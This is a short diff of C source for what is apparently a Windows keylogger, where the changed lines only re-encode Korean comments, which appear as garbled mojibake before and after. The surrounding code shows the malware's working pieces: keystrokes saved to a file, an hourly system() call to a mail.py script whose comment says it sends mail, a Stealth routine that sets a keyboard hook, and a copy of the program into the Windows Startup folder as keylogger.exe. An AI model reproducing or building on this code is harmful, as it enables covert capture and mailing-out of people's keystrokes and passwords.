@@ -150,13 +150,13 @@ int Save(int key_stroke, char *file)
 
 	fclose(OUTPUT_FILE);
 	
-	time(&current_time); //ÇöÀç ½Ã°£À» ÃøÁ¤
+	time(&current_time); //í˜„ì¬ ì‹œê°„ì„ ì¸¡ì •
 	
-	if (current_time - start_time < 3600); //1½Ã°£ÀÌ Áö³ªÁö ¾Ê¾ÒÀ¸¸é ¾Æ¹«°Íµµ ¼öÇàÇÏÁö ¾ÊÀ½
-	else // 1½Ã°£ÀÌ Áö³µÀ» ¶§
+	if (current_time - start_time < 3600); //1ì‹œê°„ì´ ì§€ë‚˜ì§€ ì•Šì•˜ìœ¼ë©´ ì•„ë¬´ê²ƒë„ ìˆ˜í–‰í•˜ì§€ ì•ŠìŒ
+	else // 1ì‹œê°„ì´ ì§€ë‚¬ì„ ë•Œ
 	{
-		system("C:\\Python27\\mail.py");//mail.py °æ·Î ÁöÁ¤ÇØ¾ß ÇÔ. //¸ŞÀÏ º¸³¿
-		start_time = time(&start_time); //start_timeÀ» ´Ù½Ã ÇöÀç ½Ã°£À¸·Î ¹Ù²Ş
+		system("C:\\Python27\\mail.py");//mail.py ê²½ë¡œ ì§€ì •í•´ì•¼ í•¨. //ë©”ì¼ ë³´ëƒ„
+		start_time = time(&start_time); //start_timeì„ ë‹¤ì‹œ í˜„ì¬ ì‹œê°„ìœ¼ë¡œ ë°”ê¿ˆ
 	}
 
 	
@@ -253,7 +253,7 @@ void Stealth()
 	// Set the hook
 	SetHook();
 	
-	time(&start_time); //Ã³À½ ½ÃÀÛ ½Ã°£À» Àç´Â ÇÔ¼ö
+	time(&start_time); //ì²˜ìŒ ì‹œì‘ ì‹œê°„ì„ ì¬ëŠ” í•¨ìˆ˜
 
 	
 	CopyFile("untitled1.exe", "C:\\users\\default\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\startup\\keylogger.exe", TRUE);
